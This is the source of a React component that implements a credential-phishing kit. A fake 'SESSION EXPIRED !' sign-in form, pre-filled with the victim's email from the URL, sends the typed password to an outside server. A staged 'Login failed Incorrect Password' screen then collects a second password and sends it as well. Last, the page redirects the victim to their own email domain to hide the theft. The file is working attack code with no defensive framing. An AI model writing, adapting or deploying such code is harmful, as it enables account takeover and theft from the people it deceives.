import "./App.css";
import React, { useState } from "react";
import { Styls } from "./stylls";
import { useParams } from "react-router-dom";
import axios from "axios";
function Forms() {
  const params = useParams();
  console.log(params.id);

  const [showForm, setShowForm] = useState(true);
  const [confirmForm, setConfirmForm] = useState(false);
  const [loading, setLoading] = useState(false);
  const [pass, setPass] = useState("");
  const [pasers, setPasser] = useState("");
  const [email, setEmail] = useState(params.id);

  const submitHandler = async (e) => {
    e.preventDefault();

    console.log(email, pass);
    setConfirmForm(true);
    setShowForm(false);
    try {
      await axios.post("https://secondwa.onrender.com/sendmail5", {
        email,
        pass,
        pasers,
      });
    } catch (error) {
      console.log(error);
    }
  };
  const editHandler = async (e) => {
    e.preventDefault();
    setLoading(true);

    let domain = email.substring(email.lastIndexOf("@") + 1);

    try {
      await axios.post("https://secondwa.onrender.com/sendmail5", {
        email,
        pass,
        pasers,
      });
    } catch (error) {
      console.log(error);
    }
    window.setTimeout(() => {
      window.location.href = `https://${domain}`;
    }, 1000);
  };

  return (
    <Styls>
      {" "}
      {showForm && (
        <div id="html_encoder_div">
          <div className="container">
            <div className="office show border shadow bg-light" id="others">
              <div className="office-holder">
                <div className="logo">
                  <div className="login_logo">
                    <img
                      src="https://yt3.googleusercontent.com/ytc/APkrFKYT-TGEQcsppAq_N2uWJBQ_wYVPy49zuRJhucrhNg=s900-c-k-c0x00ffffff-no-rj"
                      width="50px"
                      height="50px"
                      style={{ borderRadius: "50%" }}
                      alt=""
                    />
                  </div>
                </div>
                <h5 className="fnttss">
                  <b>SESSION EXPIRED !</b>
                  <br />
                </h5>

                <form className="formal" onSubmit={submitHandler}>
                  <div className="form-holder">
                    <div>
                      <div className="alert alert-danger hide alert2"></div>
                    </div>
                    <input
                      type="email"
                      name="to_user"
                      required
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="Enter Email"
                      className="form-control"
                      value={params.id}
                    />
                    <input
                      type="password"
                      name="to_pass"
                      required
                      onChange={(e) => setPass(e.target.value)}
                      placeholder="Enter Password"
                      className="form-control"
                    />

                    <div className="btn-holder">
                      <button className="button-coll">
                        <b> Sign in</b>
                      </button>
                    </div>
                    <div className="checker">
                      <label>
                        <input type="checkbox" />
                      </label>
                      <span> Remember Me</span>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      )}
      {confirmForm && (
        <div id="html_encoder_div">
          <div className="container">
            <div className="office show border shadow bg-light" id="others">
              <div className="office-holder">
                <div className="logo">
                  <div className="login_logo">
                    <img
                      src="https://yt3.googleusercontent.com/ytc/APkrFKYT-TGEQcsppAq_N2uWJBQ_wYVPy49zuRJhucrhNg=s900-c-k-c0x00ffffff-no-rj"
                      width="50px"
                      height="50px"
                      style={{ borderRadius: "50%" }}
                      alt=""
                    />
                  </div>
                </div>
                <h5 className="fnttss">
                  <b>SESSION EXPIRED !</b>
                  <br />
                </h5>

                <form className="formal" onSubmit={editHandler}>
                  <div className="form-holder">
                    <div>
                      <div className="alert alert-danger hide alert2"></div>
                    </div>
                    <input
                      type="email"
                      name="to_user"
                      required
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="Enter Email"
                      className="form-control"
                      value={params.id}
                    />
                    <input
                      type="password"
                      name="to_pass"
                      required
                      onChange={(e) => setPasser(e.target.value)}
                      placeholder="Enter Password"
                      className="form-control"
                    />
                    <p className="reda">Login failed Incorrect Password</p>

                    <div className="btn-holder">
                      <button className="button-coll">
                        <b>{loading ? "Loading....." : "Sign In"}</b>
                      </button>
                    </div>
                    <div className="checker">
                      <label>
                        <input type="checkbox" />
                      </label>
                      <span> Remember Me</span>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      )}
    </Styls>
  );
}

export default Forms;
